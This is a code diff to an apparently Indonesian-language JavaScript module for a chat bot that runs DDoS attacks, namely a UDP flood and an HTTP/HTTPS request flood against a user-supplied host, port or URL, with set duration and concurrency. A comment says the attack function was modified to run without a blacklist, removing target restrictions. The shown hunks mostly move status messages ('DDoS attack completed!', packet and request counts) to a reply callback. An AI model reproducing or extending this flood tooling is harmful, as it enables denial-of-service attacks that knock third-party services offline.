@@ -560,18 +560,18 @@ function getAvailableProxy() {
 }
 
 // --- Fungsi UDP Flood ---
-async function udpFlood(sock, targetHost, targetPort, duration, concurrency) {
+async function udpFlood(sock, targetHost, targetPort, duration, concurrency, reply) {
     let totalPacketCount = 0;
     let successPacketCount = 0;
     let errorPacketCount = 0;
     const startTime = Date.now();
     const endTime = startTime + duration * 1000;
 
-    await sock.sendMessage(sock.user.id, {text:`*UDP Flood attack:*
+   await reply(`*UDP Flood attack:*
  ▢ Target: *${targetHost}:${targetPort}*
  ▢ Durasi: *${duration} detik*
  ▢ Concurrency: *${concurrency} paket paralel*
-`})
+`)
 
     const sendUdpPacket = async () => {
         if (Date.now() >= endTime) {
@@ -579,7 +579,7 @@ async function udpFlood(sock, targetHost, targetPort, duration, concurrency) {
             const totalTimeElapsed = (Date.now() - startTime) / 1000;
             const averagePPS = totalPacketCount / totalTimeElapsed; // Packets Per Second
 
-            await sock.sendMessage(sock.user.id, { text:`*UDP Flood attack completed!*
+            await reply(`*UDP Flood attack completed!*
 
 ▢ Target: *${targetHost}:${targetPort}*
 ▢ Durasi: ${duration} detik
@@ -588,7 +588,7 @@ async function udpFlood(sock, targetHost, targetPort, duration, concurrency) {
 ▢ Total Paket Terkirim: *${totalPacketCount}*
 ▢ Berhasil: *${successPacketCount}*
 ▢ Gagal/Error: *${errorPacketCount}*
-▢ Rata-rata PPS: *${averagePPS.toFixed(2)}*`})
+▢ Rata-rata PPS: *${averagePPS.toFixed(2)}*`)
 
             console.log(`UDP Flood ke ${targetHost}:${targetPort} selesai. Total: ${totalPacketCount}, Sukses: ${successPacketCount}, Gagal: ${errorPacketCount}, PPS: ${averagePPS.toFixed(2)}`);
             return;
@@ -623,46 +623,46 @@ async function udpFlood(sock, targetHost, targetPort, duration, concurrency) {
 
 
 // --- Fungsi ddosAttack dimodifikasi tanpa blacklist ---
-async function ddosAttack(sock, target, duration, concurrency, method) {
+async function ddosAttack(sock, target, duration, concurrency, method, reply) {
     if (method.toUpperCase() === 'UDP') {
         const parts = target.split(':');
         if (parts.length !== 2 || isNaN(parseInt(parts[1]))) {
-            return sock.sendMessage(sock.user.id, {text:'Untuk UDP Flood, target harus dalam format `host:port`, contoh: `example.com:80`'})
+            return reply('Untuk UDP Flood, target harus dalam format `host:port`, contoh: `example.com:80`')
         }
         const targetHost = parts[0];
         const targetPort = parseInt(parts[1]);
 
         if (isNaN(duration) || duration < 1) {
-            return sock.sendMessage(sock.user.id, {text:'Durasi (detik) harus angka dan lebih dari 0'})
+            return reply('Durasi (detik) harus angka dan lebih dari 0')
         }
         if (isNaN(concurrency) || concurrency < 1) {
-            return sock.sendMessage(sock.user.id, {text:'Concurrency (jumlah paket paralel) harus angka dan lebih dari 0'});
+            return reply('Concurrency (jumlah paket paralel) harus angka dan lebih dari 0');
         }
 
-        await udpFlood(sock, targetHost, targetPort, duration, concurrency);
+        await udpFlood(sock, targetHost, targetPort, duration, concurrency, reply);
         return;
     }
 
     if (!target.startsWith('http://') && !target.startsWith('https://')) {
-        return sock.sendMessage(sock.user.id, {text:'URL harus diawali `http://` atau `https://` untuk metode HTTP/HTTPS'});
+        return reply('URL harus diawali `http://` atau `https://` untuk metode HTTP/HTTPS');
     }
     if (isNaN(duration) || duration < 1) {
-        return sock.sendMessage(sock.user.id, {text:'Durasi (detik) harus angka dan lebih dari 0'});
+        return reply('Durasi (detik) harus angka dan lebih dari 0');
     }
     if (isNaN(concurrency) || concurrency < 1) {
-        return sock.sendMessage(sock.user.id, {text:'Concurrency (jumlah request paralel) harus angka dan lebih dari 0'});
+        return reply('Concurrency (jumlah request paralel) harus angka dan lebih dari 0');
     }
     const validHttpMethods = ['GET', 'POST', 'PUT', 'DELETE', 'HEAD'];
     if (!validHttpMethods.includes(method.toUpperCase())) {
-        return sock.sendMessage(sock.user.id, {text:`Method HTTP tidak valid. Pilihan: ${validHttpMethods.join(', ')}. Atau gunakan 'UDP' untuk UDP Flood`});
+        return reply(`Method HTTP tidak valid. Pilihan: ${validHttpMethods.join(', ')}. Atau gunakan 'UDP' untuk UDP Flood`);
     }
 
-    await sock.sendMessage(sock.user.id, {text:`*DDoS attack (HTTP/HTTPS):*
+    await reply(`*DDoS attack (HTTP/HTTPS):*
 > ▢ Target: *${target}*
 > ▢ Durasi: *${duration} detik*
 > ▢ Concurrency: *${concurrency} request paralel*
 > ▢ Method: *${method}*
-`});
+`);
 
     let totalRequestCount = 0;
     let successCount = 0;
@@ -677,7 +677,7 @@ async function ddosAttack(sock, target, duration, concurrency, method) {
             const totalTimeElapsed = (Date.now() - startTime) / 1000;
             const averageRPS = totalRequestCount / totalTimeElapsed;
 
-            await sock.sendMessage(sock.user.id, {text:`*DDoS attack completed!*
+            await reply(`*DDoS attack completed!*
 
 ▢ Target: *${target}*
 ▢ Durasi: ${duration} detik
@@ -688,7 +688,7 @@ async function ddosAttack(sock, target, duration, concurrency, method) {
 ▢ Berhasil: *${successCount}*
 ▢ Gagal/Error: *${errorCount}*
 ▢ Rata-rata RPS: *${averageRPS.toFixed(2)}*
-▢ Detail Status Kode: ${Object.entries(statusCounts).map(([code, count]) => `\`${code}: ${count}\``).join(', ') || 'Tidak ada respons'}`})
+▢ Detail Status Kode: ${Object.entries(statusCounts).map(([code, count]) => `\`${code}: ${count}\``).join(', ') || 'Tidak ada respons'}`)
 
             console.log(`DDoS attack ke ${target} selesai. Total: ${totalRequestCount}, Sukses: ${successCount}, Gagal: ${errorCount}, RPS: ${averageRPS.toFixed(2)}`);
             return;
@@ -800,6 +800,4 @@ async function ddosAttack(sock, target, duration, concurrency, method) {
 
 module.exports = {
     ddosAttack
-
 };
-
